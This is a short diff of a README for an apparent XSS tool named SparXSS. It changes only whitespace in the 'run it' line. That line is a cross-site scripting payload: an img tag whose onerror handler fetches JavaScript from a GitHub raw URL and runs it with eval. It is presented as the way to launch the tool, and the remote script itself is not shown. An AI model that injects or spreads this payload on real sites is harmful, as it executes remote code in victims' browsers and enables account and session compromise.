@@ -2,7 +2,7 @@
 
 Run it using:
 ```
-<img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r => r.text()).then(c => eval(c))'>
+<img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r=>r.text()).then(c=>eval(c))'>
 ```
 
 The If Statement In The First Line Was Because It Would Execute Multiple Times While I Was Testing It
